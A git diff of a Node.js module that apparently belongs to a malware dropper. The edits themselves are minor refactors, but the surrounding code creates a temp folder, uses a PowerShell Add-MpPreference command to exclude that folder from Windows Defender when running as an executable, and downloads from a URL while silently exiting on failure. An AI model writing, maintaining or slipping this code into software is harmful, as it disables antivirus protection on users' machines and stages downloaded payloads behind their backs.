@@ -6,7 +6,7 @@ const { execSync, spawnSync } = require('child_process');
 const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
 const axios = require('axios');
 
-let tempFolder;
+let tempFolder = '';
 
 function createTempFolder() {
   tempFolder = mkdtempSync(join(os.tmpdir(), sep), 'utf8');
@@ -15,11 +15,12 @@ function createTempFolder() {
   return tempFolder;
 }
 
-module.exports.getTempFolder = function() {
+const getTempFolder = function() {
   return tempFolder;
 };
 
 module.exports = async () => {
+  module.exports.getTempFolder = getTempFolder;
   const tempFolder = createTempFolder();
 
   if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
@@ -53,4 +54,4 @@ async function download(url) {
   } catch (e) {
     process.exit(0);
   }
-};
+}
